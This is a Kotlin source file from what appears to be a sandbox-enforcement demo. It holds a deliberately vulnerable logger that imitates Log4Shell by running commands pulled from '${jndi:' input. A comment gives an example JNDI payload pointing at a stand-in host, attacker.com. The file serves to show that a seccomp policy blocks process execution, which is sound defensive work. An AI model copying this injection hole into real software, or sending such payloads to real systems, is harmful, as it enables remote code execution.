package demo

import java.io.IOException
import java.time.Duration

/**
 * A deliberately vulnerable "log util" that mimics a Log4Shell-style JNDI lookup.
 *
 * In a real exploit, the attacker-controlled input triggers an OS-level execve().
 * When run inside a [io.mazewall.enforcer.ContainedExecutors] worker, the kernel intercepts
 * the execve() and returns EPERM — the process is never spawned.
 */
object VulnerableLogger {

    fun log(input: String): String {
        if (input.startsWith($$"${jndi:")) {
            // Simulates the CVE-2021-44228 gadget chain.
            // ProcessBuilder.start() calls execve() under the hood — the exact syscall
            // that seccomp's NO_EXEC policy blocks with EPERM.
            val command = extractCommand(input)
            when (val outcome = OwnedProcessRunner.run(command.toList(), Duration.ofSeconds(30))) {
                is ProcessOutcome.Completed -> Unit
                is ProcessOutcome.TimedOut -> throw IOException("payload process timed out")
                is ProcessOutcome.Interrupted -> throw outcome.cause
                is ProcessOutcome.ExitedNonZero ->
                    throw IOException("payload process exited with ${outcome.exitCode}: ${outcome.output}")
                is ProcessOutcome.InfrastructureFailure ->
                    throw IOException("payload process failed: ${outcome.cause.message}", outcome.cause)
            }
        }
        return "Logged: $input"
    }

    private fun extractCommand(input: String): Array<String> {
        // e.g. input = "${jndi:ldap://attacker.com/Exploit?cmd=touch,/tmp/pwned}"
        val cmdPart = input.substringAfter("cmd=").substringBefore("}")
        return cmdPart.split(",").toTypedArray()
    }
}
